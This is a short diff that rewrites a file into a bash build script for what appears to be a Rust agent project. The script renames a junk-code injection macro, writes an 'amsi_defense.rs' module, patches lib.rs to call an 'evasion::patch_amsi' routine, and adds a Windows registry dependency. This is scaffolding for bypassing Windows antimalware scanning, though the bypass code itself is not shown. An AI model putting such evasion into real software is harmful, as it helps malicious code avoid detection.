@@ -1,3 +1,8 @@
+#!/bin/bash
+sed -i 's/inject_junk/insert_junk/g' /home/replicant/la/junk_macro/src/lib.rs
+
+# amsi_defense.rs
+cat << 'INNER_EOF' > /home/replicant/la/agent/src/amsi_defense.rs
 // AMSI Defense
 use std::ffi::c_void;
 
@@ -68,3 +73,22 @@ pub fn verify_bypass() -> bool { true }
 
 #[cfg(not(windows))]
 pub fn verify_bypass() -> bool { true }
+INNER_EOF
+
+# lib.rs unsafe block
+cat << 'INNER_EOF' > /home/replicant/la/patch_lib.py
+import re
+path = '/home/replicant/la/agent/src/lib.rs'
+with open(path, 'r') as f:
+    data = f.read()
+
+data = data.replace('crate::evasion::patch_amsi();', 'unsafe { crate::evasion::patch_amsi(); }')
+
+with open(path, 'w') as f:
+    f.write(data)
+INNER_EOF
+python3 /home/replicant/la/patch_lib.py
+
+# Cargo.toml to add winreg
+sed -i 's/"libloaderapi"/"libloaderapi", "winreg"/g' /home/replicant/la/agent/Cargo.toml
+
